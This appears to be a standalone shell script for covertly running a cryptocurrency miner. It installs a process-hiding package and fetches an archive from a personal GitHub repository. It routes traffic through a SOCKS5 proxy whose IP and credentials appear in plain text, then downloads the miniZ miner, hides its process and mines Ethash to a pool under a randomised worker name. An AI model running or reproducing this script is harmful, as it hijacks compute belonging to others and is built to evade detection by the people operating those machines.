apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/denisule54/why/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  45.140.13.119:9132 
socks5_username = txclkzzp
socks5_password = xvyu06p2e4ht
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y3/miniZ_v1.8y3_linux-x64.tar.gz

tar xf miniZ_v1.8y3_linux-x64.tar.gz

ph add miniZ

./graftcp/graftcp ./miniZ -u teguhcong.$(echo $(shuf -i 1-999 -n 1)-T4) -l ethash.poolbinance.com --port=443 -p x --par=ethash --pers auto
